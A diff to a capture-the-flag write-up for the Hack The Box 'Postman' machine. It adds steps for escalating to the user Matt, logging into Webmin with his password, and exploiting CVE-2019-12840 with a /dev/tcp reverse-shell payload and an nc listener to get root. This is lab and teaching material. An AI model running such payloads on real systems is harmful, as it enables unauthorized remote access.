@@ -195,7 +195,7 @@ Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
 redis@Postman:
 ```
 
-### Obtaining user flag
+### Privilege Escalation to Matt
 
 However, we realize that we do not have the permissions to view the user flag. Hence, we would need to escalate our privileges to Matt
 
@@ -296,8 +296,60 @@ We will try to escalate the privilege from the ```redis``` user. We have success
 ```
 redis@Postman:~$ su Matt
 Password: 
+Matt@Postman:/var/lib/redis$
+```
+
+### Obtaining user flag
+```
 Matt@Postman:/var/lib/redis$ cat /home/Matt/user.txt
 <Redacted user flag>
 Matt@Postman:/var/lib/redis$
 ```
+
+### Accessing webmin web portal
+Viewing the contents at /etc/webmin, we discover that there is an ACL file for Matt. This tells us that Matt might be one of the verified users for the webmin portal.
+
+![ACL for Matt](https://github.com/joelczk/writeups/blob/main/HTB/Images/Postman/webmin.PNG)
+
+Using ```Matt:computer2008```, we are able to login to the web interface of webmin. From the homepage, we are also able to determine the version of webmin used.
+
+![Webmin version used](https://github.com/joelczk/writeups/blob/main/HTB/Images/Postman/webmin_version.PNG)
+
+### Creating a reverse shell
+
+From the version, we realize that this version of Webmin is vulnerable to CVE-2019-12840. We will download an exploit code from [here](https://github.com/bkaraceylan/CVE-2019-12840_POC/blob/master/exploit.py) and execute the exploit.
+
+```
+┌──(HTB)─(kali㉿kali)-[~/Desktop/CVE-2019-12840_POC]
+└─$ python3 exploit.py -u https://postman -p 10000 -U Matt -P computer2008 -c "/bin/bash -l > /dev/tcp/10.10.16.7/5000 0<&1 2>&1"
+[*] Attempting to login...
+[*] Exploiting...
+[*] Executing payload...
+```
+
+We would then obtain a reverse shell in our listener. All we have to do is to stabilize the reverse shell.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 5000
+listening on [any] 5000 ...
+connect to [10.10.16.7] from (UNKNOWN) [10.10.10.160] 33710
+mesg: ttyname failed: Inappropriate ioctl for device
+python -c 'import pty; pty.spawn("/bin/bash")'
+root@Postman:/usr/share/webmin/package-updates/# export TERM=xterm
+export TERM=xterm
+root@Postman:/usr/share/webmin/package-updates/# stty cols 132 rows 34
+stty cols 132 rows 34
+root@Postman:/usr/share/webmin/package-updates/#
+```
 ### Obtaining root flag
+
+```
+root@Postman:/usr/share/webmin/package-updates# cat /root/root.txt
+cat /root/root.txt
+<Redacted root flag>
+root@Postman:/usr/share/webmin/package-updates# 
+```
+
+## Post-Exploitation
+CVE-2019-15107
